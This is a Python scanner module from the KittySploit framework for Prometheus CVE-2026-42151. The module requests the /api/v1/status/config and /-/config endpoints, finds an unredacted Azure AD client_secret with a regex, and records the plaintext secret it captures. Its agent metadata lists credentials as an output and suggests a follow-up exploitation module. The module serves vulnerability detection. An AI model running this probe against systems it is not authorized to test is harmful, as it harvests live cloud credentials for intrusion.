#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Detect Prometheus CVE-2026-42151 Azure AD client_secret plaintext exposure."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Prometheus CVE-2026-42151 Secret Disclosure Detect",
        "description": (
            "Detects CVE-2026-42151 in Prometheus 2.48.0–3.5.2 and 3.6.0–3.11.2: "
            "OAuthConfig.ClientSecret was a plain Go string instead of config_util.Secret, "
            "so /api/v1/status/config and /-/config emit the real Azure AD client_secret "
            "instead of redacting it as '<secret>'."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": ["CVE-2026-42151"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-42151",
            "https://www.cve.org/CVERecord?id=CVE-2026-42151",
        ],
        "modules": ["auxiliary/admin/http/prometheus_cve_2026_42151_info_disclosure"],
        "tags": [
            "web",
            "scanner",
            "prometheus",
            "monitoring",
            "info-disclosure",
            "credentials",
            "azure",
            "oauth",
            "cve-2026-42151",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "credentials", "exploit_paths"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["prometheus"],
                "endpoint_pattern_any": ["/api/v1/status/config", "/-/config"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "info_disclosure", "from_detail": "config endpoint leak"},
                    {"capability": "credentials", "from_detail": "azure client_secret"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/prometheus_cve_2026_42151_info_disclosure",
                ],
            },
        },
    }

    port = OptPort(9090, "Prometheus HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)

    def run(self):
        base = (self.path or "/").rstrip("/")
        endpoints = [
            f"{base}/api/v1/status/config" if base else "/api/v1/status/config",
            f"{base}/-/config" if base else "/-/config",
        ]
        raw_yaml = None
        used_path = None

        for path in endpoints:
            try:
                response = self.http_request(
                    method="GET",
                    path=path,
                    allow_redirects=False,
                    timeout=int(self.timeout or 10),
                )
            except Exception as exc:
                print_status(f"CVE-2026-42151 probe failed on {path}: {exc.__class__.__name__}")
                continue
            if not response or int(response.status_code or 0) != 200:
                continue
            if "status/config" in path:
                body, err = parse_json_response(response)
                if err or not body:
                    raw_yaml = response.text or ""
                else:
                    raw_yaml = (body.get("data") or {}).get("yaml") or response.text or ""
            else:
                raw_yaml = response.text or ""
            used_path = path
            break

        if not raw_yaml:
            return False

        match = re.search(r"client_secret:\s*(.+)", raw_yaml)
        if not match:
            print_status("CVE-2026-42151 no client_secret in config (Azure AD OAuth may be unset)")
            return False

        secret_value = match.group(1).strip().strip("'\"")
        if secret_value == "<secret>":
            print_status("CVE-2026-42151 client_secret redacted — patched")
            return False

        reason = (
            f"CVE-2026-42151: Azure AD client_secret leaked in plaintext via {used_path}"
        )
        print_status("CVE-2026-42151 vuln=True client_secret=plaintext")
        self.set_info(
            severity="high",
            reason=reason,
            vulnerable=True,
            cve="CVE-2026-42151",
            path=used_path,
            client_secret=secret_value,
        )
        return True
